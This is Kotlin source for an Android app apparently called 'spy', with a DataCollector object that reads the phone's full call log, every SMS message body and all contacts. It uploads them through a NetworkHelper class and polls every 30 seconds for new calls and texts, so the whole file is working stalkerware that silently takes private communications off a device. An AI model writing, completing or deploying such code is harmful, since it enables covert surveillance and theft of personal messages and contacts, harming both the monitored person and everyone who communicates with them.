package com.gauravhanna.spy

import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object DataCollector {
    private const val TAG = "DataCollector"
    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var lastCallTimestamp = 0L
    private var lastSmsTimestamp = 0L
    private var initialRunDone = false

    // ========== PUBLIC FUNCTIONS FOR BackgroundService ==========

    fun getCallLogs(context: Context): List<CallLogEntry> {
        val calls = mutableListOf<CallLogEntry>()
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        ) ?: return calls

        cursor.use {
            val numberCol = it.getColumnIndex(CallLog.Calls.NUMBER)
            val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
            val durationCol = it.getColumnIndex(CallLog.Calls.DURATION)
            val dateCol = it.getColumnIndex(CallLog.Calls.DATE)

            while (it.moveToNext()) {
                val number = if (numberCol >= 0) it.getString(numberCol) ?: "" else ""
                val name = if (nameCol >= 0) it.getString(nameCol) else null
                val type = when {
                    typeCol >= 0 -> when (it.getInt(typeCol)) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        else -> "missed"
                    }
                    else -> "unknown"
                }
                val duration = if (durationCol >= 0) it.getInt(durationCol) else 0
                val date = if (dateCol >= 0) it.getLong(dateCol) else 0L
                calls.add(CallLogEntry(number, name, type, duration, date))
            }
        }
        Log.d(TAG, "getCallLogs: found ${calls.size} calls")
        return calls
    }

    fun getSmsLogs(context: Context): List<SmsEntry> {
        val smsList = mutableListOf<SmsEntry>()
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            "${Telephony.Sms.DATE} DESC"
        ) ?: return smsList

        cursor.use {
            val addressCol = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyCol = it.getColumnIndex(Telephony.Sms.BODY)
            val dateCol = it.getColumnIndex(Telephony.Sms.DATE)

            while (it.moveToNext()) {
                val address = if (addressCol >= 0) it.getString(addressCol) ?: "" else ""
                val body = if (bodyCol >= 0) it.getString(bodyCol) ?: "" else ""
                val date = if (dateCol >= 0) it.getLong(dateCol) else 0L
                smsList.add(SmsEntry(address, body, date))
            }
        }
        Log.d(TAG, "getSmsLogs: found ${smsList.size} SMS")
        return smsList
    }

    fun getContacts(context: Context): List<ContactEntry> {
        val contactsList = mutableListOf<ContactEntry>()
        val cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        ) ?: return contactsList

        cursor.use {
            val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
            val numberCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)

            while (it.moveToNext()) {
                val name = if (nameCol >= 0) it.getString(nameCol) ?: "" else ""
                val number = if (numberCol >= 0) it.getString(numberCol) ?: "" else ""
                contactsList.add(ContactEntry(name, number))
            }
        }
        Log.d(TAG, "getContacts: found ${contactsList.size} contacts")
        return contactsList
    }

    // ========== OTHER FUNCTIONS ==========

    fun start(context: Context) {
        Log.d(TAG, "DataCollector start() called")
        if (!initialRunDone) {
            collectAllCalls(context)
            collectAllSms(context)
            collectAllContacts(context)
            initialRunDone = true
        }
        executor.scheduleAtFixedRate({
            collectNewCalls(context)
            collectNewSms(context)
        }, 0, 30, TimeUnit.SECONDS)
    }

    fun forceSync(context: Context) {
        executor.execute {
            Log.d(TAG, "Force sync triggered")
            collectNewCalls(context)
            collectNewSms(context)

            val prefs = context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
            val lastContactSync = prefs.getLong("last_contact_sync", 0)
            if (System.currentTimeMillis() - lastContactSync > 24 * 60 * 60 * 1000) {
                collectAllContacts(context)
                prefs.edit().putLong("last_contact_sync", System.currentTimeMillis()).apply()
                Log.d(TAG, "Contacts sync triggered (daily)")
            }
        }
    }

    private fun getColumnIndexOrThrow(cursor: Cursor, columnName: String): Int {
        val idx = cursor.getColumnIndex(columnName)
        if (idx == -1) throw IllegalArgumentException("Column $columnName not found")
        return idx
    }

    private fun collectAllCalls(context: Context) {
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            null,
            null,
            "${CallLog.Calls.DATE} ASC"
        ) ?: return
        try {
            val numberIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.NUMBER)
            val nameIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.CACHED_NAME)
            val typeIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.TYPE)
            val durationIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.DURATION)
            val dateIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.DATE)

            val calls = mutableListOf<CallLogEntry>()
            while (cursor.moveToNext()) {
                val number = cursor.getString(numberIdx) ?: ""
                val name = cursor.getString(nameIdx)
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    else -> "missed"
                }
                val duration = cursor.getInt(durationIdx)
                val date = cursor.getLong(dateIdx)
                calls.add(CallLogEntry(number, name, type, duration, date))
                if (date > lastCallTimestamp) lastCallTimestamp = date
            }
            if (calls.isNotEmpty()) {
                Log.d(TAG, "Sending ${calls.size} existing call logs")
                NetworkHelper.sendCalls(context, calls)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting all calls: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    private fun collectAllSms(context: Context) {
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            "${Telephony.Sms.DATE} ASC"
        ) ?: return
        try {
            val addressIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.ADDRESS)
            val bodyIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.BODY)
            val dateIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.DATE)

            val smsList = mutableListOf<SmsEntry>()
            while (cursor.moveToNext()) {
                val address = cursor.getString(addressIdx) ?: ""
                val body = cursor.getString(bodyIdx) ?: ""
                val date = cursor.getLong(dateIdx)
                smsList.add(SmsEntry(address, body, date))
                if (date > lastSmsTimestamp) lastSmsTimestamp = date
            }
            if (smsList.isNotEmpty()) {
                Log.d(TAG, "Sending ${smsList.size} existing SMS")
                NetworkHelper.sendSMS(context, smsList)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting all SMS: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    private fun collectAllContacts(context: Context) {
        val cursor = context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null,
            null
        ) ?: return
        try {
            val idIdx = getColumnIndexOrThrow(cursor, ContactsContract.Contacts._ID)
            val nameIdx = getColumnIndexOrThrow(cursor, ContactsContract.Contacts.DISPLAY_NAME)
            val contacts = mutableListOf<ContactEntry>()
            while (cursor.moveToNext()) {
                val id = cursor.getString(idIdx)
                val name = cursor.getString(nameIdx) ?: ""
                var number = ""
                val phoneCursor = context.contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null,
                    "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                    arrayOf(id),
                    null
                )
                phoneCursor?.use {
                    if (it.moveToFirst()) {
                        val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        if (numberIdx != -1) {
                            number = it.getString(numberIdx) ?: ""
                        }
                    }
                }
                contacts.add(ContactEntry(name, number))
            }
            if (contacts.isNotEmpty()) {
                Log.d(TAG, "Sending ${contacts.size} contacts")
                NetworkHelper.sendContacts(context, contacts)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting contacts: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    private fun collectNewCalls(context: Context) {
        val selection = "${CallLog.Calls.DATE} > ?"
        val selectionArgs = arrayOf(lastCallTimestamp.toString())
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            null,
            selection,
            selectionArgs,
            "${CallLog.Calls.DATE} ASC"
        ) ?: return
        try {
            val numberIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.NUMBER)
            val nameIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.CACHED_NAME)
            val typeIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.TYPE)
            val durationIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.DURATION)
            val dateIdx = getColumnIndexOrThrow(cursor, CallLog.Calls.DATE)

            val calls = mutableListOf<CallLogEntry>()
            while (cursor.moveToNext()) {
                val number = cursor.getString(numberIdx) ?: ""
                val name = cursor.getString(nameIdx)
                val type = when (cursor.getInt(typeIdx)) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    else -> "missed"
                }
                val duration = cursor.getInt(durationIdx)
                val date = cursor.getLong(dateIdx)
                calls.add(CallLogEntry(number, name, type, duration, date))
                if (date > lastCallTimestamp) lastCallTimestamp = date
            }
            if (calls.isNotEmpty()) {
                Log.d(TAG, "Sending ${calls.size} new call logs")
                NetworkHelper.sendCalls(context, calls)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting new calls: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    private fun collectNewSms(context: Context) {
        val selection = "${Telephony.Sms.DATE} > ?"
        val selectionArgs = arrayOf(lastSmsTimestamp.toString())
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            selection,
            selectionArgs,
            "${Telephony.Sms.DATE} ASC"
        ) ?: return
        try {
            val addressIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.ADDRESS)
            val bodyIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.BODY)
            val dateIdx = getColumnIndexOrThrow(cursor, Telephony.Sms.DATE)

            val smsList = mutableListOf<SmsEntry>()
            while (cursor.moveToNext()) {
                val address = cursor.getString(addressIdx) ?: ""
                val body = cursor.getString(bodyIdx) ?: ""
                val date = cursor.getLong(dateIdx)
                smsList.add(SmsEntry(address, body, date))
                if (date > lastSmsTimestamp) lastSmsTimestamp = date
            }
            if (smsList.isNotEmpty()) {
                Log.d(TAG, "Sending ${smsList.size} new SMS")
                NetworkHelper.sendSMS(context, smsList)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting new SMS: ${e.message}")
        } finally {
            cursor.close()
        }
    }

    // ========== DATA CLASSES ==========

    data class CallLogEntry(
        val number: String,
        val name: String?,
        val type: String,
        val duration: Int,
        val date: Long
    )

    data class SmsEntry(
        val address: String,
        val body: String,
        val date: Long
    )

    data class ContactEntry(
        val name: String,
        val number: String
    )
}